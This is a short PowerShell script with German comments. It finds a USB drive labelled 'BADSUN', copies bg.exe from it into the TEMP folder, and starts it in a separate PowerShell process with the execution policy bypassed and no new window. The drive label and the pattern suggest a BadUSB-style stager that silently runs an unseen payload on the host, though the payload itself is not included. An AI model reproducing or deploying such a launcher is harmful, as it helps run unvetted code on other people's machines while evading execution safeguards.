function Get-USBDriveLetter {
    $usbDrive = Get-CimInstance -ClassName Win32_Volume -Filter "Label = 'BADSUN'" | Select-Object -First 1
    return $usbDrive.DriveLetter
}

# USB-Laufwerksbuchstaben ermitteln
$usbDriveLetter = Get-USBDriveLetter

if ($usbDriveLetter) {
    # Pfad zur bg.exe-Datei auf dem USB-Laufwerk
    $usbExePath = Join-Path -Path $usbDriveLetter -ChildPath "bg.exe"
    
    # Pfad zum temporären Ordner
    $tempExePath = Join-Path -Path $env:TEMP -ChildPath "bg.exe"

    try {
        # Datei vom USB-Laufwerk in den temporären Ordner kopieren
        Copy-Item -Path $usbExePath -Destination $tempExePath -Force

        # bg.exe im Hintergrund ausführen und ExecutionPolicy Bypass setzen
        $command = "& `"" + $tempExePath + "`""
        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoLogo -NoProfile -ExecutionPolicy Bypass -Command `"$command`"" -NoNewWindow

        # Sound abspielen
        [System.Media.SystemSounds]::Beep.Play()

    } catch {
        Write-Host "Fehler beim Kopieren oder Ausführen des Skripts: $_"
    }
} else {
    Write-Host "USB-Laufwerk wurde nicht gefunden."
}
